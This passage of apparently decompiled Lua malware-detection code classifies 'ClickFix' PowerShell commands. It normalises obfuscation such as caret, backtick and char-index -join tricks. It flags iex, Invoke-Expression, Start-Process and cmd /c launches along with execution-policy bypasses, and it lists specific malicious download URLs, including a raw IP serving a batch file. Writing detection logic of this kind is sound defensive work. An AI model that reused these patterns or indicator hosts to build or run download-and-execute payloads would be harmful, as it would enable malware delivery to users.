    L16_2 = "^iex%(%((.-)%)%.content%)$"
    L14_2 = L14_2(L15_2, L16_2)
    L12_2 = L14_2 or L12_2
    if not L14_2 then
      L14_2 = string
      L14_2 = L14_2.match
      L15_2 = L11_2
      L16_2 = "^iex%s*%((.-)%)$"
      L14_2 = L14_2(L15_2, L16_2)
      L12_2 = L14_2 or L12_2
      if not L14_2 then
        L14_2 = string
        L14_2 = L14_2.match
        L15_2 = L11_2
        L16_2 = "^invoke%-expression%s*%((.-)%)$"
        L14_2 = L14_2(L15_2, L16_2)
        L12_2 = L14_2
      end
    end
  end
  if L12_2 ~= nil then
    L14_2 = string
    L14_2 = L14_2.match
    L15_2 = L12_2
    L16_2 = "^%((.-)%)$"
    L14_2 = L14_2(L15_2, L16_2)
    L12_2 = L14_2 or L12_2
    if not L14_2 then
    end
    L14_2 = string
    L14_2 = L14_2.find
    L15_2 = L12_2
    L16_2 = "https://t-trustrest.com/hex/01zmhvk5zb"
    L17_2 = 1
    L18_2 = true
    L14_2 = L14_2(L15_2, L16_2, L17_2, L18_2)
    if L14_2 then
      L14_2 = string
      L14_2 = L14_2.gsub
      L15_2 = L12_2
      L16_2 = " %-timeoutsec 45$"
      L17_2 = ""
      L14_2 = L14_2(L15_2, L16_2, L17_2)
      L12_2 = L14_2
    end
    L14_2 = L26_1
    L15_2 = L12_2
    L14_2, L15_2 = L14_2(L15_2)
    if L15_2 == "" then
      L16_2 = L28_1
      L17_2 = L14_2
      L16_2 = L16_2(L17_2)
      if L16_2 then
        L16_2 = "block"
        return L16_2
      end
      L16_2 = L27_1
      L17_2 = L14_2
      L16_2 = L16_2(L17_2)
      if L16_2 then
        L16_2 = "lowfi"
        return L16_2
      end
    end
  end
  L14_2 = string
  L14_2 = L14_2.gsub
  L15_2 = L11_2
  L16_2 = "^set%-executionpolicy unrestricted %-scope currentuser %-force;%s*"
  L17_2 = ""
  L14_2 = L14_2(L15_2, L16_2, L17_2)
  L11_2 = L14_2
  L14_2 = string
  L14_2 = L14_2.match
  L15_2 = L11_2
  L16_2 = "^([^;]+);%s*([^;]+)$"
  L14_2, L15_2 = L14_2(L15_2, L16_2)
  if L14_2 == nil then
    L16_2 = ""
    return L16_2
  end
  L16_2 = L26_1
  L17_2 = L14_2
  L16_2, L17_2 = L16_2(L17_2)
  if L16_2 == "" or L17_2 == "" then
    L18_2 = ""
    return L18_2
  end
  L18_2 = string
  L18_2 = L18_2.match
  L19_2 = L15_2
  L20_2 = "^([%a%-]+)%s+"
  L18_2 = L18_2(L19_2, L20_2)
  if not L18_2 then
    L18_2 = string
    L18_2 = L18_2.match
    L19_2 = L15_2
    L20_2 = "^([&%.])%s+"
    L18_2 = L18_2(L19_2, L20_2)
  end
  L19_2 = L25_1
  L20_2 = L15_2
  L19_2 = L19_2(L20_2)
  L20_2 = ""
  L21_2 = string
  L21_2 = L21_2.match
  L22_2 = L15_2
  L23_2 = "^iex%s*%((.-)%)$"
  L21_2 = L21_2(L22_2, L23_2)
  if not L21_2 then
    L21_2 = string
    L21_2 = L21_2.match
    L22_2 = L15_2
    L23_2 = "^invoke%-expression%s*%((.-)%)$"
    L21_2 = L21_2(L22_2, L23_2)
  end
  if L21_2 then
    L22_2 = string
    L22_2 = L22_2.match
    L23_2 = L21_2
    L24_2 = "^([%a%-]+)%s+"
    L22_2 = L22_2(L23_2, L24_2)
    if L22_2 ~= "gc" and L22_2 ~= "get-content" then
      L23_2 = ""
      return L23_2
    end
    L23_2 = L25_1
    L24_2 = L21_2
    L23_2 = L23_2(L24_2)
    L19_2 = L23_2
    L23_2 = L19_2[1]
    if L23_2 ~= L22_2 then
      L23_2 = ""
      return L23_2
    end
    L23_2 = #L19_2
    if L23_2 == 3 then
      L23_2 = L19_2[3]
      if L23_2 == "-raw" then
        L20_2 = L19_2[2]
      end
    end
    L23_2 = #L19_2
    if L23_2 == 4 then
      L23_2 = L19_2[2]
      if L23_2 ~= "-path" then
        L23_2 = L19_2[2]
      end
      if L23_2 == "-literalpath" then
        L23_2 = L19_2[4]
        if L23_2 == "-raw" then
          L20_2 = L19_2[3]
        end
      end
    end
  else
    if L18_2 ~= nil then
      L22_2 = L19_2[1]
      if L22_2 == L18_2 then
        goto lbl_299
      end
    end
    L22_2 = ""
    do return L22_2 end
    goto lbl_350
    ::lbl_299::
    L22_2 = L19_2[1]
    if L22_2 ~= "start-process" then
      L22_2 = L19_2[1]
      if L22_2 ~= "saps" then
        goto lbl_317
      end
    end
    L22_2 = #L19_2
    if L22_2 == 2 then
      L20_2 = L19_2[2]
    end
    L22_2 = #L19_2
    if L22_2 == 3 then
      L22_2 = L19_2[2]
      if L22_2 == "-filepath" then
        L20_2 = L19_2[3]
        goto lbl_350
        ::lbl_317::
        L22_2 = #L19_2
        if L22_2 == 2 then
          L22_2 = L19_2[1]
          if L22_2 ~= "&" then
            L22_2 = L19_2[1]
            if L22_2 ~= "." then
              L22_2 = L19_2[1]
              if L22_2 ~= "iex" then
                L22_2 = L19_2[1]
                if L22_2 ~= "invoke-expression" then
                  goto lbl_334
                end
              end
            end
          end
          L20_2 = L19_2[2]
        else
          ::lbl_334::
          L22_2 = #L19_2
          if L22_2 == 3 then
            L22_2 = L19_2[1]
            if L22_2 == "cmd" then
              L22_2 = L19_2[2]
              if L22_2 == "/c" then
                L22_2 = string
                L22_2 = L22_2.gsub
                L23_2 = L19_2[3]
                L24_2 = "^%.\\"
                L25_2 = ""
                L22_2 = L22_2(L23_2, L24_2, L25_2)
                L20_2 = L22_2
              end
            end
          end
        end
      end
    end
  end
  ::lbl_350::
  if L20_2 ~= L17_2 then
    L22_2 = ""
    return L22_2
  end
  if L16_2 == "http://108.165.15.151/instal" then
    if L17_2 == "%temp%\\w.bat" then
      goto lbl_374
    end
    L22_2 = string
    L22_2 = L22_2.match
    L23_2 = L17_2
    L24_2 = "^%a:\\.+\\w%.bat$"
    L22_2 = L22_2(L23_2, L24_2)
    if L22_2 then
      goto lbl_374
    end
  end
  if L16_2 == "https://infinitecopy.com/export.php" then
    L22_2 = string
    L22_2 = L22_2.match
    L23_2 = L17_2
    L24_2 = "^[%w_%-]+%.dat$"
    L22_2 = L22_2(L23_2, L24_2)
    ::lbl_374::
    if L22_2 then
      L22_2 = "block"
      return L22_2
    end
  end
  L22_2 = L27_1
  L23_2 = L16_2
  L22_2 = L22_2(L23_2)
  if L22_2 then
    L22_2 = "lowfi"
    return L22_2
  end
  L22_2 = ""
  return L22_2
end

ClassifyClickFixExecution = L34_1

function L34_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L1_2 = type
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if L1_2 == "string" then
    L1_2 = #A0_2
    if not (3000 < L1_2) then
      goto lbl_11
    end
  end
  L1_2 = ""
  do return L1_2 end
  ::lbl_11::
  L1_2 = string
  L1_2 = L1_2.lower
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  L2_2 = string
  L2_2 = L2_2.gsub
  L3_2 = L1_2
  L4_2 = "%^"
  L5_2 = ""
  L2_2 = L2_2(L3_2, L4_2, L5_2)
  L1_2 = L2_2
  L2_2 = string
  L2_2 = L2_2.gsub
  L3_2 = L1_2
  L4_2 = "%`"
  L5_2 = ""
  L2_2 = L2_2(L3_2, L4_2, L5_2)
  L1_2 = L2_2
  L2_2 = "(['\"])([%w_.%-]+)%1%s*%[([%d,%s]+)%]%s*%-join%s*()"
  L3_2 = string
  L3_2 = L3_2.gsub
  L4_2 = L1_2
  L5_2 = L2_2
  
  function L6_2(A0_3, A1_3, A2_3, A3_3)
    local L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3, L12_3, L13_3, L14_3, L15_3
    L4_3 = #A1_3
    if not (256 < L4_3) then
      L4_3 = #A2_3
      if not (256 < L4_3) then
        goto lbl_9
      end
    end
    L4_3 = nil
    do return L4_3 end
    ::lbl_9::
    L4_3 = string
    L4_3 = L4_3.sub
    L5_3 = L1_2
    L6_3 = A3_3
    L4_3 = L4_3(L5_3, L6_3)
    L5_3 = string
    L5_3 = L5_3.match
    L6_3 = L4_3
    L7_3 = "^%$[%a_][%w_]*"
    L5_3 = L5_3(L6_3, L7_3)
    if not L5_3 then
      L5_3 = string
      L5_3 = L5_3.match
      L6_3 = L4_3
      L7_3 = "^''"
      L5_3 = L5_3(L6_3, L7_3)
      if not L5_3 then
        L5_3 = string
        L5_3 = L5_3.match
        L6_3 = L4_3
        L7_3 = "^\"\""
        L5_3 = L5_3(L6_3, L7_3)
        if not L5_3 then
          L5_3 = nil
          return L5_3
        end
      end
    end
    L5_3 = {}
    L6_3 = string
    L6_3 = L6_3.gmatch
    L7_3 = A2_3
    L8_3 = ","
    L7_3 = L7_3 .. L8_3
    L8_3 = "(.-),"
    L6_3, L7_3, L8_3 = L6_3(L7_3, L8_3)
    for L9_3 in L6_3, L7_3, L8_3 do
      L10_3 = tonumber
      L11_3 = L9_3
      L10_3 = L10_3(L11_3)
      if L10_3 ~= nil then
        L11_3 = #A1_3
        if not (L10_3 >= L11_3) then
          L11_3 = #L5_3
          if not (64 <= L11_3) then
            goto lbl_59
          end
        end
      end
      L11_3 = nil
      do return L11_3 end
      ::lbl_59::
      L11_3 = #L5_3
      L11_3 = L11_3 + 1
      L12_3 = string
      L12_3 = L12_3.sub
      L13_3 = A1_3
      L14_3 = L10_3 + 1
      L15_3 = L10_3 + 1
      L12_3 = L12_3(L13_3, L14_3, L15_3)
      L5_3[L11_3] = L12_3
    end
    L6_3 = next
    L7_3 = L5_3
    L6_3 = L6_3(L7_3)
    if L6_3 == nil then
      L6_3 = nil
      return L6_3
    end
    L6_3 = A0_3
    L7_3 = table
    L7_3 = L7_3.concat
    L8_3 = L5_3
    L7_3 = L7_3(L8_3)
    L8_3 = A0_3
    L9_3 = " -join "
    L6_3 = L6_3 .. L7_3 .. L8_3 .. L9_3
    return L6_3
  end
  
  L7_2 = 16
  L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2)
  return L3_2
end

NormalizeClickFixCommand = L34_1
